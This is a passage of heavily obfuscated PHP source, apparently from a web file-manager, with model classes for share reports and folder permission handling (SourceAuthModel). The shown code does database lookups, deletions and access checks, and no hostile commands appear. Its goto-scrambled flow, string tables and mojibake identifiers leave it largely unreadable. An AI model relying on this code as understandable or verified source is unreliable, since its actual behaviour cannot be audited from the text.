array($bÛ¼ˆº‰¦[911], 0), $bÛ¼ˆº‰¦[671] => 3); $A«á¿×ˆÄù = Model($bÛ¼ˆº‰¦[2243])->where($cß¡ğó°´)->field($bÛ¼ˆº‰¦[419])->select(); goto B‰ ÚÒÒ©˜; CÊø‰ƒøî–: } protected function remove($D¦ªô»‡•ì) { goto DàËÚô Š‚; c¹Œƒ°Òâµ: for ($BÒèÉ¢òÓ¥ = 0; $BÒèÉ¢òÓ¥ < count($CÇÄ˜ç´¼à); $BÒèÉ¢òÓ¥++) { $b®ÔÛÇî˜¢ = $this->getInfo($CÇÄ˜ç´¼à[$BÒèÉ¢òÓ¥]); if ($b®ÔÛÇî˜¢[$D„èØ¡ŠÛ¦[448]] == $D„èØ¡ŠÛ¦[83]) { Model($D„èØ¡ŠÛ¦[507])->eventShare($b®ÔÛÇî˜¢[$D„èØ¡ŠÛ¦[369]], $D„èØ¡ŠÛ¦[2231]); } if ($b®ÔÛÇî˜¢[$D„èØ¡ŠÛ¦[446]] == $D„èØ¡ŠÛ¦[83]) { Model($D„èØ¡ŠÛ¦[507])->eventShare($b®ÔÛÇî˜¢[$D„èØ¡ŠÛ¦[369]], $D„èØ¡ŠÛ¦[2230]); } } return $Dˆ™ÁÇÈè; goto cÌåƒÆ¤Î; D‡ÏÙ³ääÎ: $Dˆ™ÁÇÈè = $this->where($BäåÓÊ—¡î)->delete(); if ($Dˆ™ÁÇÈè) { Model($D„èØ¡ŠÛ¦[539])->where(array($D„èØ¡ŠÛ¦[441] => $D¦ªô»‡•ì))->delete(); } $CÇÄ˜ç´¼à = is_array($D¦ªô»‡•ì) ? $D¦ªô»‡•ì[1] : array($D¦ªô»‡•ì); goto c¹Œƒ°Òâµ; DàËÚô Š‚: $D„èØ¡ŠÛ¦ =& $_SERVER[í™]; if (is_array($D¦ªô»‡•ì)) { $D¦ªô»‡•ì = array($D„èØ¡ŠÛ¦[7], $D¦ªô»‡•ì); } $BäåÓÊ—¡î = array($D„èØ¡ŠÛ¦[441] => $D¦ªô»‡•ì); goto D‡ÏÙ³ääÎ; cÌåƒÆ¤Î: } protected function removeBySource($bñã©÷Çˆç) { goto d„îˆ÷Ï£µ; d„îˆ÷Ï£µ: $Aö¡ÅÀ•Ç¡ =& $_SERVER[í™]; $d…†’¹Û™Ê = array($Aö¡ÅÀ•Ç¡[383] => array($Aö¡ÅÀ•Ç¡[384], $bñã©÷Çˆç)); $DæÅá½‘ = $this->field($Aö¡ÅÀ•Ç¡[441])->where($d…†’¹Û™Ê)->select(); goto a¸¤ç†¯˜ë; e™ê·©Ï«‘: $this->where($d…†’¹Û™Ê)->delete(); Model($Aö¡ÅÀ•Ç¡[539])->where($d…†’¹Û™Ê)->delete(); goto c¨ì†—ãá; a¸¤ç†¯˜ë: $DæÅá½‘ = array_to_keyvalue($DæÅá½‘, $Aö¡ÅÀ•Ç¡[33], $Aö¡ÅÀ•Ç¡[441]); if (!$DæÅá½‘) { return; } $d…†’¹Û™Ê = array($Aö¡ÅÀ•Ç¡[440] => array($Aö¡ÅÀ•Ç¡[384], $DæÅá½‘)); goto e™ê·©Ï«‘; c¨ì†—ãá: } public function listAll($AñÊ´¦á³Ö) { goto bõœ›´‡ò›; bõœ›´‡ò›: $E¹Ï¨³«Ğ¯ =& $_SERVER[í™]; $c’Ó„î˜‰ = array(); if ($AñÊ´¦á³Ö[$E¹Ï¨³«Ğ¯[1423]]) { $c’Ó„î˜‰[$E¹Ï¨³«Ğ¯[1423]] = $AñÊ´¦á³Ö[$E¹Ï¨³«Ğ¯[1423]]; } goto Bæõ‚·ÌÍ; A¸Î©Ó†ó—: return $F’‰‘øˆ; goto F«á¡óŒÌ; cÀÒºôÅºø: $F’‰‘øˆ = $this->_makeOrder()->where($c’Ó„î˜‰)->selectPage(20); if (empty($F’‰‘øˆ[$E¹Ï¨³«Ğ¯[354]])) { return array(); } $this->_listDataApply($F’‰‘øˆ[$E¹Ï¨³«Ğ¯[354]]); goto A¸Î©Ó†ó—; Bæõ‚·ÌÍ: if ($AñÊ´¦á³Ö[$E¹Ï¨³«Ğ¯[684]]) { $f±íÕ³éù = $AñÊ´¦á³Ö[$E¹Ï¨³«Ğ¯[449]] ? $AñÊ´¦á³Ö[$E¹Ï¨³«Ğ¯[449]] : strtotime(date($E¹Ï¨³«Ğ¯[2245])); $c’Ó„î˜‰[$E¹Ï¨³«Ğ¯[187]] = array($E¹Ï¨³«Ğ¯[321], array($AñÊ´¦á³Ö[$E¹Ï¨³«Ğ¯[684]], $f±íÕ³éù)); } if ($AñÊ´¦á³Ö[$E¹Ï¨³«Ğ¯[29]]) { $c’Ó„î˜‰[$AñÊ´¦á³Ö[$E¹Ï¨³«Ğ¯[29]]] = 1; } else { $c’Ó„î˜‰[] = array($E¹Ï¨³«Ğ¯[446] => array($E¹Ï¨³«Ğ¯[911], 0), $E¹Ï¨³«Ğ¯[448] => array($E¹Ï¨³«Ğ¯[911], 0), $E¹Ï¨³«Ğ¯[2221] => $E¹Ï¨³«Ğ¯[2178]); } if ($AñÊ´¦á³Ö[$E¹Ï¨³«Ğ¯[2174]]) { $c’Ó„î˜‰[] = array($E¹Ï¨³«Ğ¯[443] => $AñÊ´¦á³Ö[$E¹Ï¨³«Ğ¯[2174]], $E¹Ï¨³«Ğ¯[1328] => array($E¹Ï¨³«Ğ¯[733], "\45{$AñÊ´¦á³Ö[$E¹Ï¨³«Ğ¯[2174]]}\45"), $E¹Ï¨³«Ğ¯[2221] => $E¹Ï¨³«Ğ¯[2178]); } goto cÀÒºôÅºø; F«á¡óŒÌ: } public function listDataApply($f°¸ƒ¤Œ·) { $this->_listDataApply($f°¸ƒ¤Œ·); return $f°¸ƒ¤Œ·; } private function _listDataApply(&$Bµù‘Œä×ø) { $cŒ¹¯´¶ë =& $_SERVER[í™]; $f©ÖÓ‰Óšé = array_to_keyvalue($Bµù‘Œä×ø, $cŒ¹¯´¶ë[33], $cŒ¹¯´¶ë[1423]); $cì¹È¿ô¸‡ = Model($cŒ¹¯´¶ë[479])->userListInfo(array_unique($f©ÖÓ‰Óšé)); $B£‘âÃß‚Í = array_to_keyvalue($Bµù‘Œä×ø, $cŒ¹¯´¶ë[33], $cŒ¹¯´¶ë[369]); $c¾¼áÕ‡×” = Model($cŒ¹¯´¶ë[734])->sourceListInfo($B£‘âÃß‚Í, !0); foreach ($Bµù‘Œä×ø as &$EŠˆ°íÎ) { $E¯†‘Íâ‘Ó = $EŠˆ°íÎ[$cŒ¹¯´¶ë[1423]]; $EŠˆ°íÎ[$cŒ¹¯´¶ë[2246]] = $cì¹È¿ô¸‡[$E¯†‘Íâ‘Ó] ? $cì¹È¿ô¸‡[$E¯†‘Íâ‘Ó] : !1; $DÍ äÅ²˜ = $EŠˆ°íÎ[$cŒ¹¯´¶ë[369]]; $EŠˆ°íÎ[$cŒ¹¯´¶ë[391]] = $c¾¼áÕ‡×”[$DÍ äÅ²˜] ? $c¾¼áÕ‡×”[$DÍ äÅ²˜] : !1; } } private function _makeOrder($eÎ›«Â…à¼ = '') { goto dÔŞƒœ‡àÉ; Bó¹ëäÕÄÌ: $A»ß³‚Å–Ä = Input::get($Eíù‡íŞ[407], $Eíù‡íŞ[7], $Eíù‡íŞ[389], $d¿½ğ•ñïõ); $A±ùŠ ‹Ç§ = Input::get($Eíù‡íŞ[408], $Eíù‡íŞ[7], $Eíù‡íŞ[2247], array($Eíù‡íŞ[2173], $Eíù‡íŞ[404])); $A±ùŠ ‹Ç§ = $cùÒ÷¦‚Ğœ[$A±ùŠ ‹Ç§]; goto cŠéË»×á; dÔŞƒœ‡àÉ: $Eíù‡íŞ =& $_SERVER[í™]; $d¿½ğ•ñïõ = array($Eíù‡íŞ[187], $Eíù‡íŞ[449], $Eíù‡íŞ[2233], $Eíù‡íŞ[2234]); $cùÒ÷¦‚Ğœ = array($Eíù‡íŞ[402] => $Eíù‡íŞ[403], $Eíù‡íŞ[404] => $Eíù‡íŞ[405]); goto Bó¹ëäÕÄÌ; cŠéË»×á: $eÎ›«Â…à¼ = $eÎ›«Â…à¼ . "{$A»ß³‚Å–Ä}\40{$A±ùŠ ‹Ç§}"; return $this->order($eÎ›«Â…à¼); goto cì³Î’Ğë©; cì³Î’Ğë©: } public function reportAdd($Bª£¿¬Äå) { $eí‚â¶•­è =& $_SERVER[í™]; $fñÆææ’ƒ‡ = array($eí‚â¶•­è[441] => $Bª£¿¬Äå[$eí‚â¶•­è[441]], $eí‚â¶•­è[1423] => USER_ID); if (Model($eí‚â¶•­è[2243])->where($fñÆææ’ƒ‡)->find()) { return !1; } $AŒ®ÃèŞÅ = array($eí‚â¶•­è[441] => $Bª£¿¬Äå[$eí‚â¶•­è[441]], $eí‚â¶•­è[1328] => $Bª£¿¬Äå[$eí‚â¶•­è[1328]], $eí‚â¶•­è[369] => $Bª£¿¬Äå[$eí‚â¶•­è[369]], $eí‚â¶•­è[419] => $Bª£¿¬Äå[$eí‚â¶•­è[419]], $eí‚â¶•­è[1423] => USER_ID, $eí‚â¶•­è[29] => $Bª£¿¬Äå[$eí‚â¶•­è[29]], $eí‚â¶•­è[405] => $Bª£¿¬Äå[$eí‚â¶•­è[405]]); return Model($eí‚â¶•­è[2243])->add($AŒ®ÃèŞÅ); } public function reportList($aİø¢‚„š) { goto eÎºñÔÎê‰; dÔ´“²´š‡: $FêùßÜËË = array($cßœ‹Í¬‹[402] => $cßœ‹Í¬‹[403], $cßœ‹Í¬‹[404] => $cßœ‹Í¬‹[405]); $Aæ³Áµí¡ = $cßœ‹Í¬‹[2251] . $FêùßÜËË[$A÷¿¯İÏ¹]; $fºÑ¹¾Ã¾« = Model($cßœ‹Í¬‹[2243])->where($EŞ×“Ÿ‚)->order($Aæ³Áµí¡)->selectPage(20); goto BêÒËË‰…—; eÎºñÔÎê‰: $cßœ‹Í¬‹ =& $_SERVER[í™]; $EŞ×“Ÿ‚ = array(); if ($aİø¢‚„š[$cßœ‹Í¬‹[684]]) { $fâãˆ‚á­‹ = $aİø¢‚„š[$cßœ‹Í¬‹[449]] ? $aİø¢‚„š[$cßœ‹Í¬‹[449]] : strtotime(date($cßœ‹Í¬‹[2245])); $EŞ×“Ÿ‚[$cßœ‹Í¬‹[187]] = array($cßœ‹Í¬‹[321], array($aİø¢‚„š[$cßœ‹Í¬‹[684]], $fâãˆ‚á­‹)); } goto D÷ŒŞÍ‚Ä; D÷ŒŞÍ‚Ä: if (isset($aİø¢‚„š[$cßœ‹Í¬‹[29]]) && in_array($aİø¢‚„š[$cßœ‹Í¬‹[29]], array($cßœ‹Í¬‹[83], $cßœ‹Í¬‹[2248], $cßœ‹Í¬‹[2249], $cßœ‹Í¬‹[2250], $cßœ‹Í¬‹[1909]))) { $EŞ×“Ÿ‚[$cßœ‹Í¬‹[29]] = $aİø¢‚„š[$cßœ‹Í¬‹[29]]; } if (isset($aİø¢‚„š[$cßœ‹Í¬‹[671]]) && in_array($aİø¢‚„š[$cßœ‹Í¬‹[671]], array($cßœ‹Í¬‹[470], $cßœ‹Í¬‹[83], $cßœ‹Í¬‹[2248], $cßœ‹Í¬‹[2249]))) { $EŞ×“Ÿ‚[$cßœ‹Í¬‹[671]] = $aİø¢‚„š[$cßœ‹Í¬‹[671]]; } $A÷¿¯İÏ¹ = Input::get($cßœ‹Í¬‹[408], $cßœ‹Í¬‹[7], $cßœ‹Í¬‹[2247], array($cßœ‹Í¬‹[2173], $cßœ‹Í¬‹[404])); goto dÔ´“²´š‡; BêÒËË‰…—: if (empty($fºÑ¹¾Ã¾«[$cßœ‹Í¬‹[354]])) { return array(); } $this->_listDataApply($fºÑ¹¾Ã¾«[$cßœ‹Í¬‹[354]]); return $fºÑ¹¾Ã¾«; goto C‡ÏĞµîÂ; C‡ÏĞµîÂ: } public function reportStatus($f ì‡ØÁõ“) { goto C·ªà¿à•; fÛ ­Ö¿Û: if (!$AßÕøÚ…£Ã) { return !1; } $dµ©®‚ = array($aá‡‚ÚÒàî[671] => $f ì‡ØÁõ“[$aá‡‚ÚÒàî[671]]); if ($f ì‡ØÁõ“[$aá‡‚ÚÒàî[671]] == $aá‡‚ÚÒàî[2249] && $AßÕøÚ…£Ã[$aá‡‚ÚÒàî[671]] == $aá‡‚ÚÒàî[2249]) { $dµ©®‚[$aá‡‚ÚÒàî[671]] = 0; } goto b›»ã–Çì; CšéäÕ®ó£: return $a¾Ç¿ÂÓóí; goto a£Å„†Äì†; C·ªà¿à•: $aá‡‚ÚÒàî =& $_SERVER[í™]; $f—ïõË‚‚ = array($aá‡‚ÚÒàî[367] => $f ì‡ØÁõ“[$aá‡‚ÚÒàî[367]]); $AßÕøÚ…£Ã = Model($aá‡‚ÚÒàî[2243])->where($f—ïõË‚‚)->field($aá‡‚ÚÒàî[2252])->find(); goto fÛ ­Ö¿Û; b›»ã–Çì: $a¾Ç¿ÂÓóí = Model($aá‡‚ÚÒàî[2243])->where($f—ïõË‚‚)->save($dµ©®‚); if ($f ì‡ØÁõ“[$aá‡‚ÚÒàî[671]] == $aá‡‚ÚÒàî[2248]) { if ($AßÕøÚ…£Ã[$aá‡‚ÚÒàî[419]] != $aá‡‚ÚÒàî[470] && $this->shareFileMeta($AßÕøÚ…£Ã[$aá‡‚ÚÒàî[419]])) { $this->shareFileMeta($AßÕøÚ…£Ã[$aá‡‚ÚÒàî[419]], 0); } $this->remove($AßÕøÚ…£Ã[$aá‡‚ÚÒàî[441]]); return !0; } if ($a¾Ç¿ÂÓóí && $f ì‡ØÁõ“[$aá‡‚ÚÒàî[671]] == $aá‡‚ÚÒàî[2249]) { $EËê’¿’½ = $dµ©®‚[$aá‡‚ÚÒàî[671]] == $aá‡‚ÚÒàî[2249] ? 1 : 0; $this->shareFileMeta($AßÕøÚ…£Ã[$aá‡‚ÚÒàî[419]], $EËê’¿’½); $this->removeByFile($AßÕøÚ…£Ã[$aá‡‚ÚÒàî[419]]); } goto CšéäÕ®ó£; a£Å„†Äì†: } private function removeByFile($Cƒ’¢•‡ò) { goto f¨æĞƒÆá‚; bå•äˆÓÓ: $EğÈÒÎŠìó = array($cŸÙ´ÂÁŞ[369] => array($cŸÙ´ÂÁŞ[7], $dÓ„Ÿ¸ÌÂä), $cŸÙ´ÂÁŞ[446] => 1); $Bö´Õôäï£ = Model($cŸÙ´ÂÁŞ[2071])->where($EğÈÒÎŠìó)->field($cŸÙ´ÂÁŞ[441])->select(); if (empty($Bö´Õôäï£)) { return; } goto C—Ğ¢ÉĞğ¥; f¨æĞƒÆá‚: $cŸÙ´ÂÁŞ =& $_SERVER[í™]; $Bö´Õôäï£ = Model($cŸÙ´ÂÁŞ[734])->where(array($cŸÙ´ÂÁŞ[419] => $Cƒ’¢•‡ò))->field($cŸÙ´ÂÁŞ[369])->select(); $dÓ„Ÿ¸ÌÂä = array_to_keyvalue($Bö´Õôäï£, $cŸÙ´ÂÁŞ[33], $cŸÙ´ÂÁŞ[369]); goto bå•äˆÓÓ; C—Ğ¢ÉĞğ¥: $Dùµ‘‘ôº = array_to_keyvalue($Bö´Õôäï£, $cŸÙ´ÂÁŞ[33], $cŸÙ´ÂÁŞ[441]); $this->remove($Dùµ‘‘ôº); goto F¹Á·«È·; F¹Á·«È·: } private function shareFileMeta($dİÅ”Ô’Ø, $AÒ•ù ÈÈ‰ = null) { $fÒ‹ ô½é¼ =& $_SERVER[í™]; $fæ±òÛæÇ = array($fÒ‹ ô½é¼[419] => $dİÅ”Ô’Ø, $fÒ‹ ô½é¼[89] => $fÒ‹ ô½é¼[2253]); if (is_null($AÒ•ù ÈÈ‰)) { return Model($fÒ‹ ô½é¼[2254])->where($fæ±òÛæÇ)->find(); } $fæ±òÛæÇ[$fÒ‹ ô½é¼[359]] = $AÒ•ù ÈÈ‰; Model($fÒ‹ ô½é¼[2254])->add($fæ±òÛæÇ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\165\x72\143\145\137\x61\165\164\x68"; public function getAuth($d»â°°Íø¸) { goto EçáäÓ¾ó…; C”¨‹ÃÆ¯™: return $FóÚ¨¾°ÑÔ; goto Cµªßğ¾ó; EçáäÓ¾ó…: $a±ÒùŞ«°ç =& $_SERVER[í™]; $eòÒÙ¶°œÑ = $a±ÒùŞ«°ç[2255]; $DÊĞ‡ƒ¯İÚ = array($a±ÒùŞ«°ç[369] => $d»â°°Íø¸); goto F»É‡á—åÖ; F»É‡á—åÖ: $A‡ï‹Š—Ö— = $this->field($eòÒÙ¶°œÑ)->order($a±ÒùŞ«°ç[367])->where($DÊĞ‡ƒ¯İÚ)->select(); $FóÚ¨¾°ÑÔ = array(); foreach ($A‡ï‹Š—Ö— as $e…¹ì²º”) { if (Model($a±ÒùŞ«°ç[2256])->listData($e…¹ì²º”[$a±ÒùŞ«°ç[2237]])) { $FóÚ¨¾°ÑÔ[] = $e…¹ì²º”; } } goto C”¨‹ÃÆ¯™; Cµªßğ¾ó: } public function setAuth($d¸ˆ»¾‹æµ, $b¼ÒÉ¬ºµä) { goto BˆÉ±„Ûİ; EÁåƒİÉ§: $this->where(array($f³âø›«†[383] => $d¸ˆ»¾‹æµ))->delete(); $this->addAll($a²ÑŒß£Û¿); return !0; goto bÒŞñ³­æ; BˆÉ±„Ûİ: $f³âø›«† =& $_SERVER[í™]; $CËŠáÙ¾èŠ = Model($f³âø›«†[1103])->sourceInfo($d¸ˆ»¾‹æµ); if ($CËŠáÙ¾èŠ[$f³âø›«†[371]] != SourceModel::TYPE_GROUP) { return !1; } goto bŠéØ’„½í; bŠéØ’„½í: $D¹ë¬¨¯îƒ = 1; $dïØ­¦¡ĞĞ = $CËŠáÙ¾èŠ[$f³âø›«†[458]]; if ($dïØ­¦¡ĞĞ != $D¹ë¬¨¯îƒ) { $D‹ãÌˆÌª = array($f³âø›«†[2094] => $dïØ­¦¡ĞĞ); $D¼­¾µ‰ßÉ = Model($f³âø›«†[2172])->field($f³âø›«†[1423])->where($D‹ãÌˆÌª)->select(); $D¼­¾µ‰ßÉ = array_to_keyvalue($D¼­¾µ‰ßÉ, $f³âø›«†[33], $f³âø›«†[1423]); } goto B¢ğ¦‹ƒ”; B¢ğ¦‹ƒ”: $Aøšä×œÎ¬ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $a²ÑŒß£Û¿ = array(); foreach ($b¼ÒÉ¬ºµä as $eÙİ ƒ…º½) { if (!in_array($eÙİ ƒ…º½[$f³âø›«†[371]], $Aøšä×œÎ¬)) { show_json(LNG($f³âø›«†[2257]), !1); } if ($dïØ­¦¡ĞĞ != $D¹ë¬¨¯îƒ) { if ($eÙİ ƒ…º½[$f³âø›«†[371]] == SourceModel::TYPE_GROUP) { } if ($eÙİ ƒ…º½[$f³âø›«†[458]] != 0 && !in_array($eÙİ ƒ…º½[$f³âø›«†[458]], $D¼­¾µ‰ßÉ)) { } } if ($eÙİ ƒ…º½[$f³âø›«†[458]] == 0) { $eÙİ ƒ…º½[$f³âø›«†[371]] = SourceModel::TYPE_USER; } $a²ÑŒß£Û¿[] = array($f³âø›«†[369] => $d¸ˆ»¾‹æµ, $f³âø›«†[371] => intval($eÙİ ƒ…º½[$f³âø›«†[371]]), $f³âø›«†[458] => intval($eÙİ ƒ…º½[$f³âø›«†[458]]), $f³âø›«†[2237] => intval($eÙİ ƒ…º½[$f³âø›«†[2237]]) ? intval($eÙİ ƒ…º½[$f³âø›«†[2237]]) : 0, $f³âø›«†[2238] => intval($eÙİ ƒ…º½[$f³âø›«†[2238]]) ? intval($eÙİ ƒ…º½[$f³âø›«†[2238]]) : -1); } goto EÁåƒİÉ§; bÒŞñ³­æ: } public function authClear($eÉ©½„ç®´) { $aá È—ÙøŒ =& $_SERVER[í™]; $a«ïéñôÙ = Model($aá È—ÙøŒ[1103])->sourceInfo($eÉ©½„ç®´); $dĞ˜‡™’„ = array($eÉ©½„ç®´); if ($a«ïéñôÙ[$aá È—ÙøŒ[370]] == $aá È—ÙøŒ[83]) { $b òøß¿½ = array($aá È—ÙøŒ[527] => array($aá È—ÙøŒ[485], $a«ïéñôÙ[$aá È—ÙøŒ[461]] . $eÉ©½„ç®´ . $aá È—ÙøŒ[486])); $dĞ˜‡™’„ = Model($aá È—ÙøŒ[1103])->field($aá È—ÙøŒ[383])->where($b òøß¿½)->getField($aá È—ÙøŒ[369], !0); $dĞ˜‡™’„[] = $eÉ©½„ç®´; } $this->where(array($aá È—ÙøŒ[383] => array($aá È—ÙøŒ[384], $dĞ˜‡™’„)))->delete(); return !0; } public function get($B¬ŸÇ¦‡) { $d†®Şˆ¼Ô = $this->getSourceList(array($B¬ŸÇ¦‡), !0); return $d†®Şˆ¼Ô[0]; } public function getSourceList($bó¨²ö·×“, $C‡ÓÃ‘Îˆá = false) { goto e»¹¯ˆÔ‰Û; e‚©İçéˆ‰: $D¹’•‚ÛæØ = array_values(array_unique($D¹’•‚ÛæØ)); if (!$D¹’•‚ÛæØ) { return array(); } $B‚¬´—›¡š = $cĞÇÔ¹õà[2259]; goto Câ¶ŒÚ¬±‹; e»¹¯ˆÔ‰Û: $cĞÇÔ¹õà =& $_SERVER[í™]; if (!$bó¨²ö·×“) { return array(); } $f¯ÂÒ¹‚ìº = Model($cĞÇÔ¹õà[1103]); goto E°íÙÁ„Ù”; Câ¶ŒÚ¬±‹: $AäÅ·Ö¿æ´ = array($cĞÇÔ¹õà[383] => array($cĞÇÔ¹õà[384], $D¹’•‚ÛæØ)); $d‹ÏÃ÷à‡É = $this->field($B‚¬´—›¡š)->where($AäÅ·Ö¿æ´)->select(); $d‹ÏÃ÷à‡É = array_to_keyvalue_group($d‹ÏÃ÷à‡É, $cĞÇÔ¹õà[369]); goto bĞ‹™Ì¶Õ; E°íÙÁ„Ù”: if (!$C‡ÓÃ‘Îˆá) { $AäÅ·Ö¿æ´ = array($cĞÇÔ¹õà[383] => array($cĞÇÔ¹õà[384], $bó¨²ö·×“)); $C‡ÓÃ‘Îˆá = $f¯ÂÒ¹‚ìº->field($cĞÇÔ¹õà[2258])->where($AäÅ·Ö¿æ´)->select(); $C‡ÓÃ‘Îˆá = array_to_keyvalue($C‡ÓÃ‘Îˆá, $cĞÇÔ¹õà[369]); } $D¹’•‚ÛæØ = $bó¨²ö·×“; foreach ($C‡ÓÃ‘Îˆá as $e®½ù×ÒíÑ => $BÚˆ¾¡ë) { $D©²×·Üï‘ = $f¯ÂÒ¹‚ìº->parentLevelArray($BÚˆ¾¡ë[$cĞÇÔ¹õà[461]]); $D¹’•‚ÛæØ = array_merge($D¹’•‚ÛæØ, $D©²×·Üï‘, array($e®½ù×ÒíÑ)); } goto e‚©İçéˆ‰; bĞ‹™Ì¶Õ: $d”Â‚ˆ‰ÀÍ = array(); foreach ($C‡ÓÃ‘Îˆá as $F¯è§÷¹¸› => $DÍƒˆØ–à«) { $d”Â‚ˆ‰ÀÍ[$F¯è§÷¹¸›] = $this->makeSourceAuth($DÍƒˆØ–à«, $d‹ÏÃ÷à‡É); } return $d”Â‚ˆ‰ÀÍ; goto a­ÁæÎÔ; a­ÁæÎÔ: } public function authDeepCheck($A‚Èø‰ÃĞ) { goto E÷¨õ­Ì; dç›³Ù÷£: if (!in_array($A‚Èø‰ÃĞ, $FÄ¢ËÌõ«•[$EœÀÉ‡˜³ª[2260]])) { return !1; } $F‰ÂÓÉí¾² = array(); foreach ($FÄ¢ËÌõ«•[$EœÀÉ‡˜³ª[2261]] as $EÇåõëôÃ => $BàÚ¢×©¸›) { if (!in_array($A‚Èø‰ÃĞ, $BàÚ¢×©¸›)) { continue; } $F‰ÂÓÉí¾²[] = $EÇåõëôÃ; } goto aàø¾¶¥£•; E÷¨õ­Ì: $EœÀÉ‡˜³ª =& $_SERVER[í™]; if (_get($GLOBALS, $EœÀÉ‡˜³ª[459])) { return !1; } $FÄ¢ËÌõ«• = $this->makeAuthDeep(); goto dç›³Ù÷£; aàø¾¶¥£•: $F÷•ä‚ß®§ = $F‰ÂÓÉí¾² ? $F‰ÂÓÉí¾²[0] : $A‚Èø‰ÃĞ; return array($EœÀÉ‡˜³ª[377] => -1, $EœÀÉ‡˜³ª[418] => array($EœÀÉ‡˜³ª[385] => $EœÀÉ‡˜³ª[1017], $EœÀÉ‡˜³ª[2100] => $EœÀÉ‡˜³ª[470], $EœÀÉ‡˜³ª[386] => LNG($EœÀÉ‡˜³ª[2262]), $EœÀÉ‡˜³ª[2112] => $EœÀÉ‡˜³ª[2263]), $EœÀÉ‡˜³ª[2264] => array($EœÀÉ‡˜³ª[388] => $EœÀÉ‡˜³ª[2265], $EœÀÉ‡˜³ª[75] => $F÷•ä‚ß®§)); goto cƒ‡©ÜÃ‘³; cƒ‡©ÜÃ‘³: } protected function makeAuthDeep() { goto cö°ÚßÊ£È; c ÂÆÏƒÅ°: $E©Àƒ¦Á§† = array(); $D‹ê†šãï = array(); $aÄÒ‘ïÄ§­ = array(); goto e™±•ˆ’”ˆ; FÜæË¾Š¯: $fÙøåÊ×‡ = Model($A÷»¿´Ò§–[2266])->listData(); $B½Ó¶½º”† = array(); foreach ($fÙøåÊ×‡ as $c‰ÆÉĞìØ) { if ($c‰ÆÉĞìØ[$A÷»¿´Ò§–[376]] == 0 && $c‰ÆÉĞìØ[$A÷»¿´Ò§–[2114]] == $A÷»¿´Ò§–[83]) { $B½Ó¶½º”†[] = $c‰ÆÉĞìØ[$A÷»¿´Ò§–[367]]; } } goto eÈ†‹µåŠÃ; EÚ³©©ÈÒÊ: $aŸ…Äöö = array_to_keyvalue($AÑÊ‹Ó½º, $A÷»¿´Ò§–[33], $A÷»¿´Ò§–[369]); $cå»…‘Ùë‘ = array(); $aç…Çø¿Ë = $B¤‚¿î†ğ‹; goto BÑ½÷àÂ; eÄÍŞáĞ¥: foreach ($FĞï‘—Ê§Œ as $E‹³àÊè†) { $Açšøßœ™ô = $f‚ä¿ùÏä¨->getInfo($E‹³àÊè†); $Dˆ¬äå¸Á½ = $dªù£ÓÙ¹->parentLevelArray($Açšøßœ™ô[$A÷»¿´Ò§–[461]]); $aç…Çø¿Ë = array_merge($aç…Çø¿Ë, $Dˆ¬äå¸Á½); } $aç…Çø¿Ë = array_values(array_unique($aç…Çø¿Ë)); foreach ($aç…Çø¿Ë as $E‹³àÊè†) { $Açšøßœ™ô = $f‚ä¿ùÏä¨->getInfo($E‹³àÊè†); $cå»…‘Ùë‘[] = $Açšøßœ™ô[$A÷»¿´Ò§–[391]][$A÷»¿´Ò§–[369]]; $D‹ê†šãï[$E‹³àÊè†] = $Açšøßœ™ô[$A÷»¿´Ò§–[391]][$A÷»¿´Ò§–[369]]; $aÄÒ‘ïÄ§­[$E‹³àÊè†] = $dªù£ÓÙ¹->parentLevelArray($Açšøßœ™ô[$A÷»¿´Ò§–[461]]); } goto A¬Äù˜²Ñ®; e™±•ˆ’”ˆ: if ($aŸ…Äöö) { $cÁéßÄ±ÓÈ = $dªù£ÓÙ¹->where(array($A÷»¿´Ò§–[369] => array($A÷»¿´Ò§–[384], $aŸ…Äöö)))->select(); foreach ($cÁéßÄ±ÓÈ as $dŒ‘Óµö¬Ú) { $Dˆ¬äå¸Á½ = $dªù£ÓÙ¹->parentLevelArray($dŒ‘Óµö¬Ú[$A÷»¿´Ò§–[461]]); $cå»…‘Ùë‘ = array_merge($cå»…‘Ùë‘, $Dˆ¬äå¸Á½); $aç…Çø¿Ë[] = $dŒ‘Óµö¬Ú[$A÷»¿´Ò§–[458]]; $b•£ÆÜ‰÷ë[$dŒ‘Óµö¬Ú[$A÷»¿´Ò§–[369]]] = $Dˆ¬äå¸Á½; $E©Àƒ¦Á§†[$dŒ‘Óµö¬Ú[$A÷»¿´Ò§–[369]]] = $dŒ‘Óµö¬Ú[$A÷»¿´Ò§–[458]]; } } $aç…Çø¿Ë = array_values(array_unique($aç…Çø¿Ë)); $FĞï‘—Ê§Œ = $aç…Çø¿Ë; goto eÄÍŞáĞ¥; eÈ†‹µåŠÃ: $B¤‚¿î†ğ‹ = Session::get($A÷»¿´Ò§–[2222]); $B¤‚¿î†ğ‹ = array_to_keyvalue($B¤‚¿î†ğ‹, $A÷»¿´Ò§–[33], $A÷»¿´Ò§–[2094]); $c©­³¡âë = array($A÷»¿´Ò§–[371] => SourceModel::TYPE_USER, $A÷»¿´Ò§–[458] => USER_ID); goto fœÜ³ÎÒ; A¬Äù˜²Ñ®: foreach ($b•£ÆÜ‰÷ë as $CÑº«åäÄ‰ => $dÀ«‹Ñõµì) { $dâŒîñÃÆ = $E©Àƒ¦Á§†[$CÑº«åäÄ‰]; if (!$dâŒîñÃÆ || !$D‹ê†šãï[$dâŒîñÃÆ]) { continue; } $BÒ”¾™•·Ù = array(); foreach ($aÄÒ‘ïÄ§­[$dâŒîñÃÆ] as $E‹³àÊè†) { $BÒ”¾™•·Ù[] = $D‹ê†šãï[$E‹³àÊè†]; } $b•£ÆÜ‰÷ë[$CÑº«åäÄ‰] = array_merge($BÒ”¾™•·Ù, $dÀ«‹Ñõµì); } $cå»…‘Ùë‘ = array_values(array_unique($cå»…‘Ùë‘)); $cÛÕÂœÙÓÓ = array($A÷»¿´Ò§–[2260] => $cå»…‘Ùë‘, $A÷»¿´Ò§–[2261] => $b•£ÆÜ‰÷ë); goto A›ªÍºƒÛ°; A›ªÍºƒÛ°: return $cÛÕÂœÙÓÓ; goto FŒÈÅ‰Õã·; BÑ½÷àÂ: $dªù£ÓÙ¹ = Model($A÷»¿´Ò§–[1103]); $f‚ä¿ùÏä¨ = Model($A÷»¿´Ò§–[460]); $b•£ÆÜ‰÷ë = array(); goto c ÂÆÏƒÅ°; cö°ÚßÊ£È: $A÷»¿´Ò§– =& $_SERVER[í™]; static $cÛÕÂœÙÓÓ = false; if 